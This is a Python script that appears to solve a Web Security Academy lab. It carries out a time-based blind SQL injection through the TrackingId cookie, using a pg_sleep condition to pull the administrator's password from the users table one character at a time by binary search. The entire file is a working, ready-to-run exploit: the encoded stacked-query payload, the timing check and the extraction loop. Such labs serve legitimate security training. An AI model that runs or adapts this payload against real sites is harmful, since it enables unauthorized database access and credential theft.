import requests
import time

# Target URL where the SQL injection will be tested
url = "https://0ad0008e03d4ce7d8026e436001a0031.web-security-academy.net/"

# Initial cookie setup (empty payload initially)
cookies = {'TrackingId': ''}

# Character set to test against (you can add more characters if needed)
password = ''

# Expected delay in seconds that indicates a successful injection
delay = 3

def cond(c, i, delay):
    # SQL injection payload with time-based condition
    payload = f"x'%3bselect%20case%20when%20(username%20%3d%20'administrator'%20and%20substring(password%2c{i}%2c1)%20%3c%3d%20'{c}')%20then%20pg_sleep({delay})%20else%20pg_sleep(0)%20end%20from%20users%20--"

    # Inject the payload into the cookie
    cookies['TrackingId'] = payload
    
    # Send the request with the modified cookie and measure the response time
    start_time = time.time()
    
    response = requests.get(url, cookies=cookies)

    end_time = time.time()
    response_time = end_time - start_time
    
    # Check if the response time meets the expected delay
    return response_time >= delay

# Loop over each character position (assuming password length of up to 20)
for i in range(1, 21):  # Adjust the range as needed for longer passwords
    l = ord('0')  # Convert '0' to its ASCII value (48)
    r = ord('z')  # Convert 'z' to its ASCII value (122)
    
    while l < r:
        mid = (l + r) // 2  # Calculate the midpoint
        mid_char = chr(mid)  # Convert midpoint back to character
        
        if cond(mid_char, i, delay):  # Use the character in the condition
            r = mid  # Adjust the upper bound to avoid skipping 'z'
        else:
            l = mid + 1  # Adjust the lower bound
    
    password += chr(r)
    print(f"Found character: {chr(r)}")

print(f"The password for the administrator is: {password}")
